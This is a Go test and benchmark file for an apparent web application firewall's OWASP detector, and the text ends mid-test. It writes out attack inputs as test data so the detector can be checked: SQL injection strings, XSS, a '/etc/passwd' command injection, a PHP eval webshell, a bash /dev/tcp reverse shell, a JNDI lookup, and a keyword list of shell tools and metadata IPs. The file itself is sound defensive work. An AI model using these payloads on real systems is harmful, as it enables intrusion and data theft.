package owasp

import (
	"strings"
	"testing"
)

var benchmarkOWASPHitsSink []OWASPHit
var benchmarkOWASPHitSink OWASPHit
var benchmarkOWASPBoolSink bool

func BenchmarkCheckOWASPCleanTraffic(b *testing.B) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	bodyTargets := []string{"username", "admin", "password", "test123"}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitsSink = CheckOWASP("mid", "/api/login", "page=1&sort=name", headers, bodyTargets)
	}
}

func BenchmarkCheckOWASPSQLiTraffic(b *testing.B) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}

	hits := CheckOWASP("mid", "/search", "q=1%20union%20select%20username,password%20from%20users--", headers, nil)
	if len(hits) == 0 {
		b.Fatal("expected SQLi hit")
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitsSink = CheckOWASP("mid", "/search", "q=1%20union%20select%20username,password%20from%20users--", headers, nil)
	}
}

func BenchmarkCheckOWASPXSSBareEventHandlerTraffic(b *testing.B) {
	hits := CheckOWASP("mid", "/", `name=" onmouseover="alert(1)`, nil, nil)
	if len(hits) == 0 {
		b.Fatal("expected XSS hit")
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitsSink = CheckOWASP("mid", "/", `name=" onmouseover="alert(1)`, nil, nil)
	}
}

func BenchmarkCheckOWASPCmdInjectionTraffic(b *testing.B) {
	hits := CheckOWASP("mid", "/ping", "host=8.8.8.8;cat /etc/passwd", nil, nil)
	if len(hits) == 0 {
		b.Fatal("expected command injection hit")
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitsSink = CheckOWASP("mid", "/ping", "host=8.8.8.8;cat /etc/passwd", nil, nil)
	}
}

func BenchmarkNextSQLiHitUnionSelect(b *testing.B) {
	normalized := "q=1 union select username,password from users--"
	hit, ok := nextSQLiHit(normalized, 4)
	if !ok || hit.RuleID == "" {
		b.Fatal("expected SQLi hit")
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitSink, benchmarkOWASPBoolSink = nextSQLiHit(normalized, 4)
	}
}

func BenchmarkIsCleanPathTarget(b *testing.B) {
	path := "/api/login"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPBoolSink = isCleanPathTarget(path)
	}
}

func BenchmarkIsCleanPlainQueryTarget(b *testing.B) {
	query := "page=1&sort=name"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPBoolSink = isCleanPlainQueryTarget(query)
	}
}

func BenchmarkHasPlainTargetAttackKeyword(b *testing.B) {
	input := "/api/login"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPBoolSink = hasPlainTargetAttackKeyword(input)
	}
}

func BenchmarkCheckProtocolViolationCleanHeaders(b *testing.B) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitSink, benchmarkOWASPBoolSink = checkProtocolViolation(headers, 4)
	}
}

func BenchmarkCheckProtocolViolationMixedCaseHeaders(b *testing.B) {
	headers := map[string]string{
		"content-length":    "10",
		"TRANSFER-ENCODING": "chunked",
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkOWASPHitSink, benchmarkOWASPBoolSink = checkProtocolViolation(headers, 4)
	}
}

func TestForEachBase64TokenIndexMatchesRegexp(t *testing.T) {
	tests := []struct {
		name  string
		input string
		limit int
	}{
		{name: "short tokens skipped", input: "abc ABCDEFG normal", limit: 20},
		{name: "padding kept", input: `retain=e3sgMzMzMSozMzMwIH19==&x=TlM4cUlH`, limit: 20},
		{name: "token boundaries", input: `a"e3sgMzMzMSozMzMwIH19"+plain/ABCDEF12==!`, limit: 20},
		{name: "limit applied", input: "AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD", limit: 2},
		{name: "zero limit", input: "AAAAAAAA BBBBBBBB", limit: 0},
	}

	for _, tt := range tests {
		want := reBase64Token.FindAllString(tt.input, tt.limit)
		var got []string
		forEachBase64TokenIndex(tt.input, tt.limit, func(start, end int) bool {
			got = append(got, tt.input[start:end])
			return true
		})
		if len(got) != len(want) {
			t.Fatalf("%s: got %v, want %v", tt.name, got, want)
		}
		for i := range got {
			if got[i] != want[i] {
				t.Fatalf("%s: token %d got %q, want %q; all got %v want %v", tt.name, i, got[i], want[i], got, want)
			}
		}
	}
}

func TestDecodeBase64IfSuspiciousKeepsCurrentSemantics(t *testing.T) {
	decoded := decodeBase64IfSuspicious("e3sgMzMzMSozMzMwIH19")
	if !strings.Contains(decoded, "3331*3330") {
		t.Fatalf("expected template payload to decode, got %q", decoded)
	}
	for _, input := range []string{"username", "password", "application", "AppleWebKit"} {
		if got := decodeBase64IfSuspicious(input); got != "" {
			t.Fatalf("plain token %q should not decode as suspicious content, got %q", input, got)
		}
	}
}

func TestHasLikelyBase64CandidateSkipsPlainLowercaseWords(t *testing.T) {
	if hasLikelyBase64Candidate("username") {
		t.Fatal("plain lowercase word should not enter the base64 expansion path")
	}
	if hasLikelyBase64Candidate("password") {
		t.Fatal("plain lowercase word should not enter the base64 expansion path")
	}
	if hasLikelyBase64Candidate("1%20union%20select%20username,password%20from%20users--") {
		t.Fatal("plain SQLi query string should not enter the base64 expansion path")
	}
	if hasLikelyBase64Candidate("1 union select username,password from users--") {
		t.Fatal("normalized SQLi query string should not enter the base64 expansion path")
	}
	if hasLikelyBase64Candidate("abc123def") {
		t.Fatal("digits alone should not force the base64 expansion path")
	}
	if !hasLikelyBase64Candidate(strings.Repeat("a", 12) + "%zz") {
		t.Fatal("percent marker should lower the lowercase threshold to 12")
	}
	if hasLikelyBase64Candidate(strings.Repeat("a", 11) + "%zz") {
		t.Fatal("lowercase run below 12 should still be skipped even with percent marker")
	}
	if !hasLikelyBase64Candidate("e3sgMzMzMSozMzMwIH19") {
		t.Fatal("mixed base64 payload should still enter the base64 expansion path")
	}
}

func TestNormalizeWithDecodeKeepsUrlSafeBase64LeadByteRecovery(t *testing.T) {
	withLead := normalizeWithDecodeTarget("x=-TkrenJcO0M", false)
	withoutLead := normalizeWithDecodeTarget("x=TkrenJcO0M", false)

	if !strings.Contains(strings.ToLower(withLead), "zr\\;c") {
		t.Fatalf("expected URL-safe base64 payload with leading hyphen to decode, got %q", withLead)
	}
	if strings.Contains(strings.ToLower(withoutLead), "zr\\;c") {
		t.Fatalf("payload without leading hyphen should not decode the same way, got %q", withoutLead)
	}
}

func TestNormalizeWithDecodeDecodesExtractedQueryPlusSeparatedBase64(t *testing.T) {
	values := extractQueryValues("q=prefix+e3sgMzMzMSozMzMwIH19+suffix")
	if len(values) != 1 {
		t.Fatalf("expected one decoded query value, got %v", values)
	}
	if values[0] != "prefix e3sgMzMzMSozMzMwIH19 suffix" {
		t.Fatalf("decoded query value = %q", values[0])
	}
	result := normalizeWithDecode(values[0])
	if !strings.Contains(result, "3331*3330") {
		t.Fatalf("expected extracted plus-separated base64 payload to decode, got %q", result)
	}
}

func TestLowerHeaderNameMatchesStringsToLower(t *testing.T) {
	inputs := []string{
		"Accept",
		"Accept-Encoding",
		"Accept-Language",
		"Authorization",
		"Cache-Control",
		"Connection",
		"Content-Length",
		"Content-Type",
		"Cookie",
		"DNT",
		"Host",
		"If-Modified-Since",
		"If-None-Match",
		"Origin",
		"Pragma",
		"Referer",
		"Sec-Ch-Ua",
		"Sec-Ch-Ua-Arch",
		"Sec-Ch-Ua-Bitness",
		"Sec-Ch-Ua-Full-Version",
		"Sec-Ch-Ua-Full-Version-List",
		"Sec-Ch-Ua-Mobile",
		"Sec-Ch-Ua-Model",
		"Sec-Ch-Ua-Platform",
		"Sec-Ch-Ua-Platform-Version",
		"Sec-Fetch-Dest",
		"Sec-Fetch-Mode",
		"Sec-Fetch-Site",
		"Sec-Fetch-User",
		"TE",
		"Upgrade",
		"Upgrade-Insecure-Requests",
		"User-Agent",
		"X-Client-Data",
		"user-agent",
		"x-trace",
		"X-Test",
	}
	for _, input := range inputs {
		got := lowerHeaderName(input)
		want := strings.ToLower(input)
		if got != want {
			t.Fatalf("lowerHeaderName(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestCollectTargetsSkipsMirroredLowercaseHeaders(t *testing.T) {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0;id",
		"user-agent": "Mozilla/5.0;id",
		"X-Trace":    "trace-1",
		"x-trace":    "trace-1",
	}
	targets := collectTargets("/home", "", headers, 0)
	seenUA := 0
	seenTrace := 0
	for _, target := range targets {
		switch target {
		case "Mozilla/5.0;id":
			seenUA++
		case "trace-1":
			seenTrace++
		}
	}
	if seenUA != 1 || seenTrace != 1 {
		t.Fatalf("expected mirrored headers once each, got ua=%d trace=%d targets=%v", seenUA, seenTrace, targets)
	}
}

func TestCollectTargetsPreallocatesHeaderCapacity(t *testing.T) {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0;id",
		"X-Test":     "ok",
	}
	targets := collectTargets("/home", "q=hello", headers, 0)
	if len(targets) < 4 {
		t.Fatalf("expected path, query and header targets, got %d", len(targets))
	}
	if cap(targets) < 2+len(headers) {
		t.Fatalf("targets capacity = %d, want at least %d", cap(targets), 2+len(headers))
	}
}

func TestCollectTargetsSkipsCleanBrowserUserAgent(t *testing.T) {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"X-Test":     "ok",
	}
	targets := collectTargets("/home", "", headers, 0)
	for _, target := range targets {
		if target == headers["User-Agent"] {
			t.Fatalf("clean browser User-Agent should be skipped, targets=%v", targets)
		}
	}
}

func TestCollectTargetsSkipsCleanAcceptHeader(t *testing.T) {
	headers := map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"X-Test": "ok",
	}
	targets := collectTargets("/home", "", headers, 0)
	for _, target := range targets {
		if target == headers["Accept"] {
			t.Fatalf("clean Accept header should be skipped, targets=%v", targets)
		}
	}
}

func TestCollectTargetsPreallocatesBodyCapacity(t *testing.T) {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0",
		"Accept":     "text/html",
	}
	bodyTargets := []string{"username", "admin", "password", "test123"}
	targets := collectTargets("/home", "q=hello", headers, len(bodyTargets))
	beforeCap := cap(targets)
	targets = append(targets, bodyTargets...)
	if cap(targets) != beforeCap {
		t.Fatalf("appending body targets changed capacity from %d to %d", beforeCap, cap(targets))
	}
}

func TestForEachOWASPTargetMatchesCollectTargetsAndMarksBody(t *testing.T) {
	bodyTargets := []string{"body-one", "body-two"}
	query := "q=e3sgMzMzMSozMzMwIH19"

	want := collectTargets("api/login", query, nil, len(bodyTargets))
	want = append(want, bodyTargets...)

	var got []string
	var bodyFlags []bool
	var queryPlusFlags []bool
	forEachOWASPTarget("api/login", query, nil, bodyTargets, false, false, false, func(raw string, isBodyTarget bool, queryPlusAsSpace bool) bool {
		got = append(got, raw)
		bodyFlags = append(bodyFlags, isBodyTarget)
		queryPlusFlags = append(queryPlusFlags, queryPlusAsSpace)
		return true
	})

	if len(got) != len(want) {
		t.Fatalf("target count = %d, want %d; got %v want %v", len(got), len(want), got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("target %d = %q, want %q; got %v want %v", i, got[i], want[i], got, want)
		}
		wantBody := i >= len(want)-len(bodyTargets)
		if bodyFlags[i] != wantBody {
			t.Fatalf("body flag %d = %v, want %v; flags=%v", i, bodyFlags[i], wantBody, bodyFlags)
		}
	}
	wantQueryPlusFlags := []bool{true, true, true, false, true, true}
	if len(queryPlusFlags) != len(wantQueryPlusFlags) {
		t.Fatalf("query plus flag count = %d, want %d; flags=%v", len(queryPlusFlags), len(wantQueryPlusFlags), queryPlusFlags)
	}
	for i := range wantQueryPlusFlags {
		if queryPlusFlags[i] != wantQueryPlusFlags[i] {
			t.Fatalf("query plus flag %d = %v, want %v; flags=%v targets=%v", i, queryPlusFlags[i], wantQueryPlusFlags[i], queryPlusFlags, got)
		}
	}
}

func TestNormalizeTargetPlusSemantics(t *testing.T) {
	if got := normalizeTarget("q=union+select", true); got != "q=union select" {
		t.Fatalf("query plus should decode to space, got %q", got)
	}
	if got := normalizeTarget("application/xhtml+xml", false); got != "application/xhtml+xml" {
		t.Fatalf("header plus should remain literal, got %q", got)
	}
	if got := normalizeTarget("%2Bfoo", false); got != "+foo" {
		t.Fatalf("path-style percent encoded plus should remain plus after decode, got %q", got)
	}
}

func TestShouldSkipHeaderTargetUserAgentBoundaries(t *testing.T) {
	if !shouldSkipHeaderTarget("user-agent", commonCleanBrowserUserAgent) {
		t.Fatal("clean browser User-Agent should use the header fast path")
	}
	inputs := []string{
		"Mozilla/5.0 <script>alert(1)</script>",
		"Mozilla/5.0 ${jndi:ldap://example.test/a}",
		"Mozilla/5.0' OR 1=1--",
		"Mozilla/5.0;id",
		"Mozilla/5.0 http://127.0.0.1/admin",
		commonCleanBrowserUserAgent + " <script>alert(1)</script>",
		commonCleanBrowserUserAgent + "' OR 1=1--",
	}
	for _, input := range inputs {
		if shouldSkipHeaderTarget("user-agent", input) {
			t.Fatalf("User-Agent payload %q must not use the header fast path", input)
		}
	}
}

func TestShouldSkipHeaderTargetUserAgentRejectsDangerousFragments(t *testing.T) {
	fragments := []string{
		"union",
		"insert",
		"update",
		"delete",
		"drop",
		"alter",
		"truncate",
		"select",
		"sleep",
		"benchmark",
		"waitfor",
		"information_schema",
		"outfile",
		"dumpfile",
		"extractvalue",
		"updatexml",
		"group_concat",
		"group by",
		"order by",
		"substr(",
		"substring(",
		"concat(",
		"char(",
		"chr(",
		"jndi:",
		"javascript:",
		"vbscript:",
		"data:text/html",
		"document.",
		"window.",
		"fetch(",
		"innerhtml",
		"fromcharcode",
		"constructor.constructor",
		"onload",
		"onerror",
		"onclick",
		"alert(",
		"prompt(",
		"confirm(",
		"eval(",
		"assert(",
		"system(",
		"exec(",
		"shell_exec",
		"<?php",
		"runtime.getruntime",
		"cmd.exe",
		"powershell.exe",
		"/bin/",
		"whoami",
		"wget ",
		"curl ",
		"../",
		"..\\",
		"etc/",
		"/proc/",
		"win.ini",
		"boot.ini",
		"web-inf",
		"meta-inf",
		"://",
		"169.254.169.254",
		"metadata.google",
		"100.100.100.200",
		"127.0.",
		"localhost",
		"::ffff:",
		"::1",
		"0x7f",
		"unix:",
		".nip.io",
		".xip.io",
		".sslip.io",
		"objectclass",
		")(",
		"getclass",
		"getruntime",
		"@java.",
		"new java.",
		"aced0005",
		"ro0ab",
		"ysoserial",
		"objectinputstream",
		"__schema",
		"__type",
	}
	for _, fragment := range fragments {
		input := "Mozilla/5.0 " + strings.ToUpper(fragment) + " tail"
		if shouldSkipHeaderTarget("user-agent", input) {
			t.Fatalf("User-Agent fragment %q must not use the header fast path", fragment)
		}
	}
}

func TestShouldSkipHeaderTargetAcceptBoundaries(t *testing.T) {
	cleanInputs := []string{
		"text/html",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json",
		"application/vnd.api+json;q=0.8,application/ld+json",
	}
	for _, input := range cleanInputs {
		if !shouldSkipHeaderTarget("accept", input) {
			t.Fatalf("clean Accept header %q should use the header fast path", input)
		}
	}

	payloadInputs := []string{
		"text/html,<script>alert(1)</script>",
		"text/html; q=0.9; x=UNION",
		"text/html; q=0.9; x=select",
		"text/html; q=0.9; x=or1=1",
		"text/html, http://127.0.0.1/admin",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,<script>alert(1)</script>",
		"application/json, http://127.0.0.1/admin",
		`text/html; q="0.9"`,
	}
	for _, input := range payloadInputs {
		if shouldSkipHeaderTarget("accept", input) {
			t.Fatalf("Accept payload %q must not use the header fast path", input)
		}
	}
}

func TestShouldSkipHeaderTargetStandardHeaders(t *testing.T) {
	skipped := []string{
		"host",
		"connection",
		"content-length",
		"accept-language",
		"accept-encoding",
		"authorization",
		"cache-control",
		"pragma",
		"if-modified-since",
		"if-none-match",
		"upgrade",
		"upgrade-insecure-requests",
		"dnt",
		"te",
		"origin",
		"sec-fetch-mode",
		"sec-fetch-site",
		"sec-fetch-dest",
		"sec-fetch-user",
		"sec-ch-ua",
		"sec-ch-ua-mobile",
		"sec-ch-ua-platform",
		"sec-ch-ua-arch",
		"sec-ch-ua-bitness",
		"sec-ch-ua-full-version",
		"sec-ch-ua-full-version-list",
		"sec-ch-ua-model",
		"sec-ch-ua-platform-version",
		"x-client-data",
	}
	for _, name := range skipped {
		if !shouldSkipHeaderTarget(name, "value") {
			t.Fatalf("header %q should use the skip fast path", name)
		}
	}
	for _, name := range []string{"content-type", "x-test"} {
		if shouldSkipHeaderTarget(name, "value") {
			t.Fatalf("header %q should not be skipped unconditionally", name)
		}
	}
}

func TestCheckOWASP_UserAgentPayloadsStillDetected(t *testing.T) {
	tests := []struct {
		name     string
		ua       string
		category OWASPCategory
	}{
		{name: "xss", ua: "Mozilla/5.0 <script>alert(1)</script>", category: CatXSS},
		{name: "jndi", ua: "Mozilla/5.0 ${jndi:ldap://example.test/a}", category: CatJNDI},
		{name: "sqli", ua: "Mozilla/5.0' OR 1=1--", category: CatSQLi},
		{name: "ssrf", ua: "Mozilla/5.0 http://127.0.0.1/admin", category: CatSSRF},
	}
	for _, tt := range tests {
		hits := CheckOWASP("mid", "/", "", map[string]string{"User-Agent": tt.ua}, nil)
		if !hasCategory(hits, tt.category) {
			t.Fatalf("%s User-Agent payload should trigger %s, got %+v", tt.name, tt.category, hits)
		}
	}
}

func TestCheckOWASP_AcceptPayloadsStillDetected(t *testing.T) {
	tests := []struct {
		name     string
		accept   string
		category OWASPCategory
	}{
		{name: "xss", accept: "text/html,<script>alert(1)</script>", category: CatXSS},
		{name: "sqli", accept: "text/html; q=0.9; x=' OR 1=1--", category: CatSQLi},
		{name: "ssrf", accept: "text/html, http://127.0.0.1/admin", category: CatSSRF},
	}
	for _, tt := range tests {
		hits := CheckOWASP("mid", "/", "", map[string]string{"Accept": tt.accept}, nil)
		if !hasCategory(hits, tt.category) {
			t.Fatalf("%s Accept payload should trigger %s, got %+v", tt.name, tt.category, hits)
		}
	}
}

func TestShouldScanUnicodeBase64Target(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{
			name:  "plain plus text",
			input: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			want:  false,
		},
		{
			name:  "literal unicode escapes",
			input: `prefix=\u0054\u004d\u0034\u0063\u0055payload`,
			want:  true,
		},
		{
			name:  "url encoded unicode escapes",
			input: `prefix=%5Cu0054%5Cu004d%5Cu0034%5Cu0063%5Cu0055payload`,
			want:  true,
		},
	}

	for _, tt := range tests {
		got := shouldScanUnicodeBase64Target(tt.input)
		if got != tt.want {
			t.Fatalf("%s: shouldScanUnicodeBase64Target(%q) = %v, want %v", tt.name, tt.input, got, tt.want)
		}
	}
}

func TestCheckOWASP_SQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' UNION SELECT * FROM users--", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected SQLi hit")
	}
	if hits[0].Category != CatSQLi {
		t.Fatalf("expected sqli category, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_SQLi_Low(t *testing.T) {
	// Low sensitivity requires higher score, simple comment alone shouldn't trigger
	hits := CheckOWASP("low", "/page", "q=hello--", nil, nil)
	if len(hits) > 0 {
		t.Fatal("low sensitivity should not trigger on simple comment")
	}
}

func TestCheckOWASP_CategorySensitivity_OffDisablesSQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' UNION SELECT * FROM users--", nil, nil, map[string]string{"sqli": "off"})
	if len(hits) > 0 {
		t.Fatalf("expected SQLi category to be disabled, got %+v", hits)
	}
}

func TestCheckOWASP_CategorySensitivity_OverrideRaisesSensitivity(t *testing.T) {
	hits := CheckOWASP("low", "/", "id=1; SELECT user()--", nil, nil, map[string]string{"sqli": "strict"})
	if len(hits) == 0 {
		t.Fatal("expected strict category override to detect SQLi under low global sensitivity")
	}
	if hits[0].Category != CatSQLi {
		t.Fatalf("expected sqli category, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_Webshell(t *testing.T) {
	hits := CheckOWASP("mid", "/upload.php", "<?php eval($_POST['cmd'])", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected webshell hit")
	}
	found := false
	for _, h := range hits {
		if h.Category == CatWebshell {
			found = true
		}
	}
	if !found {
		t.Fatal("expected webshell category")
	}
}

func TestCheckOWASP_RevShell(t *testing.T) {
	hits := CheckOWASP("mid", "/", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected reverse shell hit")
	}
	if hits[0].Category != CatRevShell {
		t.Fatalf("expected revshell, got %s", hits[0].Category)
	}
}

func TestCheckOWASP_PathTraversal(t *testing.T) {
	hits := CheckOWASP("mid", "/../../etc/passwd", "", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected path traversal hit")
	}
}

func TestCheckOWASP_XSS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=<script>alert(1)</script>", nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected XSS hit")
	}
}

func TestCheckOWASP_Clean(t *testing.T) {
	hits := CheckOWASP("mid", "/api/v1/users", "page=1&limit=10", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("expected no hits for clean request, got %d", len(hits))
	}
}

func TestCheckOWASP_Clean_MixedCasePath(t *testing.T) {
	hits := CheckOWASP("mid", "/API/LOGIN", "page=1&limit=10", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("expected no hits for mixed-case clean path, got %d", len(hits))
	}
}

func TestNormalize(t *testing.T) {
	input := "%27%20OR%201%3D1%20--%20"
	result := normalize(input)
	if result != "' or 1=1 " {
		t.Fatalf("unexpected normalize result: %q", result)
	}
}

func TestNormalize_OverlongUTF8(t *testing.T) {
	input := "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
	result := normalize(input)
	// Overlong UTF-8 %c0%ae→"." and remaining is URL-decoded; exact output depends on decode order.
	// The key invariant: result must contain ".." for path traversal detection.
	if !strings.Contains(result, "..") || !strings.Contains(result, "etc/passwd") {
		t.Fatalf("expected overlong UTF-8 to normalize to traversal path, got %q", result)
	}
}

func TestShouldDecodeHTMLEntities(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{
			name:  "plain query ampersand",
			input: "page=1&sort=name",
			want:  false,
		},
		{
			name:  "plain pagination ampersands",
			input: "page=2&limit=50&sort=name&order=desc",
			want:  false,
		},
		{
			name:  "numeric entity",
			input: "q=&#60;script&#62;",
			want:  true,
		},
		{
			name:  "hex numeric entity",
			input: "q=&#x3c;script&#x3e;",
			want:  true,
		},
		{
			name:  "semicolon entity",
			input: "q=&lt;script&gt;",
			want:  true,
		},
		{
			name:  "semicolonless lt entity",
			input: "q=&lt",
			want:  true,
		},
		{
			name:  "semicolonless entity prefix",
			input: "q=&copycat",
			want:  true,
		},
		{
			name:  "apos requires semicolon",
			input: "q=&apos",
			want:  false,
		},
	}

	for _, tt := range tests {
		got := shouldDecodeHTMLEntities(tt.input)
		if got != tt.want {
			t.Fatalf("%s: shouldDecodeHTMLEntities(%q) = %v, want %v", tt.name, tt.input, got, tt.want)
		}
	}
}

func TestStripSQLCommentsSkipsNonStrippableMarkers(t *testing.T) {
	inputs := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"source=arn:aws:s3:::sample-loaddata01/*&format=json",
		"id=queryvalue1/*",
		"id=1 /*!50000union*/ select * from users",
	}
	for _, input := range inputs {
		if got := stripSQLComments(input); got != input {
			t.Fatalf("stripSQLComments(%q) = %q, want unchanged", input, got)
		}
	}
}

func TestStripSQLCommentsRemovesStrippableComments(t *testing.T) {
	tests := map[string]string{
		"sel/**/ect":           "select",
		"id=1-- \nunion":       "id=1\nunion",
		"id=1 # \nunion":       "id=1 \nunion",
		"un/**/ion sel/**/ect": "union select",
	}
	for input, want := range tests {
		if got := stripSQLComments(input); got != want {
			t.Fatalf("stripSQLComments(%q) = %q, want %q", input, got, want)
		}
	}
}

// ── False Positive Tests: clean requests that must NOT trigger ──

func TestCheckOWASP_Clean_URLFragment(t *testing.T) {
	hits := CheckOWASP("mid", "/page", "id=1#section", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("URL hash fragment should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_URLFragment_High(t *testing.T) {
	hits := CheckOWASP("high", "/page", "id=1#section", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("URL hash fragment should not trigger even at high sensitivity, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_CSSColors(t *testing.T) {
	hits := CheckOWASP("mid", "/style", "color=#333&font-size=14px", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("CSS color values should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_NormalJSON(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", "", nil, []string{"search term", "John Doe", "100"})
	if len(hits) > 0 {
		t.Fatalf("normal text values should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_DoubleDashSlug(t *testing.T) {
	hits := CheckOWASP("mid", "/blog/my-article--2024", "", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("double dash in URL slug should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_NormalPagination(t *testing.T) {
	hits := CheckOWASP("mid", "/api/v1/items", "page=2&limit=50&sort=name&order=desc", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal pagination params should not trigger, got %+v", hits)
	}
}

func TestCleanPathAndQueryFastPathBoundaries(t *testing.T) {
	cleanPaths := []string{
		"/api/login",
		"/API/LOGIN",
		"/assets/app.v1/main-js",
		"/v1/users_2026/profile",
	}
	for _, path := range cleanPaths {
		if !isCleanPathTarget(path) {
			t.Fatalf("clean path %q should use fast path", path)
		}
	}

	blockedPaths := []string{
		"/api/../etc/passwd",
		"/admin;whoami",
		"/search?q=<script>",
		"/callback:http://127.0.0.1",
		"/image%2e%2e%2fetc/passwd",
	}
	for _, path := range blockedPaths {
		if isCleanPathTarget(path) {
			t.Fatalf("suspicious path %q should not use fast path", path)
		}
	}

	cleanQueries := []string{
		"page=1&sort=name",
		"page=2&limit=50&sort=name&order=desc",
		"id=12345&tab=overview",
	}
	for _, query := range cleanQueries {
		if !isCleanPlainQueryTarget(query) {
			t.Fatalf("clean query %q should use fast path", query)
		}
	}

	blockedQueries := []string{
		"q=unionselect",
		"file=../../etc/passwd",
		"next=http://127.0.0.1/admin",
		"q=%3cscript%3ealert(1)%3c/script%3e",
		"cmd=id;whoami",
		"q=or1=1",
	}
	for _, query := range blockedQueries {
		if isCleanPlainQueryTarget(query) {
			t.Fatalf("suspicious query %q should not use fast path", query)
		}
	}
}

func TestCheckOWASP_BlazeBase64PathXSSStillDetected(t *testing.T) {
	path := "/YWxlcnQuY2FsbCglMjAsICJYU1MiKTs"
	if isCleanPathTarget(path) {
		t.Fatalf("base64 path payload %q should not use clean fast path", path)
	}
	hits := CheckOWASP("high", path, "", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatalf("expected base64 path XSS payload to be detected, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_JWTAuth(t *testing.T) {
	headers := map[string]string{
		"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
	}
	hits := CheckOWASP("mid", "/api/me", "", headers, nil)
	if len(hits) > 0 {
		t.Fatalf("JWT auth header should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_UUIDParam(t *testing.T) {
	hits := CheckOWASP("mid", "/api/resource", "id=550e8400-e29b-41d4-a716-446655440000", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("UUID parameter should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_Clean_FilenamePath(t *testing.T) {
	hits := CheckOWASP("mid", "/files/reports/q1-2024.pdf", "", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal file path should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_DangerousPathCaseInsensitive(t *testing.T) {
	tests := []struct {
		name     string
		path     string
		category OWASPCategory
		ruleID   string
	}{
		{name: "f5", path: "/MGMT/TM/UTIL/BASH", category: CatCmdInject, ruleID: "owasp:path:001"},
		{name: "ofbiz", path: "/WEBTOOLS/CONTROL/SOAPSERVICE", category: CatDeserial, ruleID: "owasp:path:004"},
